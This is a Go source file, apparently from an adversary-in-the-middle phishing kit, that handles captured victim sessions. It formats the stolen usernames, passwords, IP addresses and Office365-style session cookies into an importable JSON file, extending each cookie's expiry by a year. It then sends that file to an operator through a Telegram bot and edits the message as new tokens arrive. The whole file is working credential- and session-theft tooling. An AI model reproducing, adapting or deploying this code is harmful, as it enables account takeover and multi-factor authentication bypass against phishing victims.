package main

import (
    "encoding/json"
    "fmt"
    "math/rand"
    "os"
    "path/filepath"
    "sync"
    "time"
)

type Token struct {
    Name             string      `json:"name"`
    Value            string      `json:"value"`
    Domain           string      `json:"domain,omitempty"`
    HostOnly         bool        `json:"hostOnly,omitempty"`
    Path             string      `json:"path,omitempty"`
    Secure           bool        `json:"secure,omitempty"`
    HttpOnly         bool        `json:"httpOnly,omitempty"`
    SameSite         string      `json:"sameSite,omitempty"`
    Session          bool        `json:"session,omitempty"`
    FirstPartyDomain string      `json:"firstPartyDomain,omitempty"`
    PartitionKey     interface{} `json:"partitionKey,omitempty"`
    ExpirationDate   *int64      `json:"expirationDate,omitempty"`
    StoreID          interface{} `json:"storeId,omitempty"`
}

// extractTokens handles two formats:
// 1. Nested map format (original Office365 style tokens)
// 2. Flat token list format [{ "token": "token_string" }, ...]
func extractTokens(input interface{}) []Token {
    var tokens []Token

    switch data := input.(type) {
    case map[string]map[string]map[string]interface{}:
        // Original nested parsing logic
        for domain, tokenGroup := range data {
            for _, tokenData := range tokenGroup {
                var t Token

                if name, ok := tokenData["Name"].(string); ok {
                    t.Name = name
                }
                if val, ok := tokenData["Value"].(string); ok {
                    t.Value = val
                }
                if len(domain) > 0 && domain[0] == '.' {
                    domain = domain[1:]
                }
                t.Domain = domain

                if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
                    t.HostOnly = hostOnly
                }
                if path, ok := tokenData["Path"].(string); ok {
                    t.Path = path
                }
                if secure, ok := tokenData["Secure"].(bool); ok {
                    t.Secure = secure
                }
                if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
                    t.HttpOnly = httpOnly
                }
                if sameSite, ok := tokenData["SameSite"].(string); ok {
                    t.SameSite = sameSite
                }
                if session, ok := tokenData["Session"].(bool); ok {
                    t.Session = session
                }
                if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
                    t.FirstPartyDomain = fpd
                }
                if pk, ok := tokenData["PartitionKey"]; ok {
                    t.PartitionKey = pk
                }
                if storeID, ok := tokenData["storeId"]; ok {
                    t.StoreID = storeID
                } else if storeID, ok := tokenData["StoreID"]; ok {
                    t.StoreID = storeID
                }

                exp := time.Now().AddDate(1, 0, 0).Unix()
                t.ExpirationDate = &exp

                tokens = append(tokens, t)
            }
        }

    case []interface{}:
        // Handle flat token list format: [{"token":"token_string"}, ...]
        for _, v := range data {
            tokenMap, ok := v.(map[string]interface{})
            if !ok {
                continue // skip if format unexpected
            }
            t := Token{}
            if tokenVal, ok := tokenMap["token"].(string); ok {
                t.Name = "token"
                t.Value = tokenVal

                // Optional: add expiration date for consistency
                exp := time.Now().AddDate(1, 0, 0).Unix()
                t.ExpirationDate = &exp

                tokens = append(tokens, t)
            }
        }

    default:
        // Unknown format; return empty list or could log an error
    }
    return tokens
}

// Accept token JSON strings or raw JSON bytes directly
func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
    var consolidatedTokens []Token

    for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens, customTokens} {
        if tokenJSON == "" {
            continue
        }

        // First attempt to parse as nested map[string]map[string]map...
        var nested map[string]map[string]map[string]interface{}
        if err := json.Unmarshal([]byte(tokenJSON), &nested); err == nil {
            tokens := extractTokens(nested)
            consolidatedTokens = append(consolidatedTokens, tokens...)
            continue
        }

        // Otherwise, try parse as flat list
        var flat []interface{}
        if err := json.Unmarshal([]byte(tokenJSON), &flat); err == nil {
            tokens := extractTokens(flat)
            consolidatedTokens = append(consolidatedTokens, tokens...)
            continue
        }

        // Could not parse token JSON, return error
        return nil, fmt.Errorf("failed to parse token JSON for input: %s", tokenJSON)
    }

    return consolidatedTokens, nil
}

// Define a map to store session IDs and a mutex for thread-safe access
var processedSessions = make(map[string]bool)
var sessionMessageMap = make(map[string]int)
var mu sync.Mutex

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}
func createTxtFile(session Session) (string, error) {
	// Create a random text file name
	txtFileName := generateRandomString() + ".txt"
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	// Create a new text file
	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	// Marshal the session maps into JSON byte slices
	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	}
	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	}
	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Custom: %v", err)
	}

	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))

	result, err := json.MarshalIndent(allTokens, "", "  ")
	if err != nil {
		fmt.Println("Error marshalling final tokens:", err)

	}

	fmt.Println("Combined Tokens: ", string(result))

	// Write the consolidated data into the text file
	_, err = txtFile.WriteString(string(result))
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

func formatSessionMessage(session Session) string {
	// Format the session information (no token data in message)
	return fmt.Sprintf("✨ Session Information ✨\n\n"+

		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n \n"+
		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %d\n"+
		"🕔 Update Time:   ➖ %d\n"+
		"\n"+
		"📦 Tokens are added in txt file and attached separately in message.\n",

		session.Username,
		session.Password,
		session.LandingURL,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
		session.UpdateTime,
	)
}
func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
		return
	}

	mu.Lock()
	// Check if the session is already processed
	if processedSessions[string(session.ID)] {
		mu.Unlock()
		messageID, exists := sessionMessageMap[string(session.ID)]
		if exists {
			txtFilePath, err := createTxtFile(session)
			if err != nil {
				fmt.Println("Error creating TXT file for update:", err)
				return
			}
			msg_body := formatSessionMessage(session)
			err = editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath, msg_body)
			if err != nil {
				fmt.Printf("Error editing message: %v\n", err)
			}
			os.Remove(txtFilePath)
		} else {
			fmt.Println("Message ID not found for session:", session.ID)
		}
		return
	}

	// Mark session as processed
	processedSessions[string(session.ID)] = true
	mu.Unlock()

	// Create the TXT file for the original message
	txtFilePath, err := createTxtFile(session)
	if err != nil {
		fmt.Println("Error creating TXT file:", err)
		return
	}

	// Format the message
	message := formatSessionMessage(session)

	// Send the notification and get the message ID
	messageID, err := sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
	if err != nil {
		fmt.Printf("Error sending Telegram notification: %v\n", err)
		os.Remove(txtFilePath)
		return
	}

	// Map the session ID to the message ID
	mu.Lock()
	sessionMessageMap[string(session.ID)] = messageID
	mu.Unlock()

	// Remove the temporary TXT file
	os.Remove(txtFilePath)
}
